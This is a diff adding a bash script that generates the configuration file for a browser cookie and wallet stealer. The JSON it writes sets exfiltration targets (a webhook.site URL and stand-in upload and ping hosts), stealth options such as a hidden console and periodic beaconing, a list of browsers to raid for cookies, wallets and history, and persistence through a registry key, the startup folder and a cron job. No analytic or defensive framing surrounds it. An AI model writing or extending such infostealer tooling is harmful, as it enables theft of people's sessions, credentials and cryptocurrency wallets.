@@ -1,0 +1,40 @@
+#!/bin/bash
+
+CONFIG_FILE="stealer_config.json"
+
+# Generate fresh config
+cat > "$CONFIG_FILE" << 'EOF'
+{
+  "exfiltration": {
+    "webhook_url": "https://webhook.site/YOUR-WEBHOOK-ID",
+    "upload_url": "https://upload.example.com/stealer",
+    "named_pipe_name": "CookieStealerPipe"
+  },
+  "stealth": {
+    "hide_console": true,
+    "sleep_ms": 5000,
+    "ping_back_interval": 3600000,
+    "ping_url": "https://ping.example.com/alive"
+  },
+  "targets": {
+    "browsers": ["chrome", "brave", "edge", "opera", "vivaldi", "firefox"],
+    "data_types": ["cookies", "wallets", "history", "bookmarks"]
+  },
+  "encryption": {
+    "type": "AES-GCM",
+    "key_size": 32,
+    "rsa_key_size": 2048
+  },
+  "persistence": {
+    "registry_key": "Software\\CookieStealer",
+    "startup_folder": true,
+    "cron_job": true
+  },
+  "output": {
+    "output_dir": "./stealer_data",
+    "compress_output": true
+  }
+}
+EOF
+
+echo "Config generated: $CONFIG_FILE"
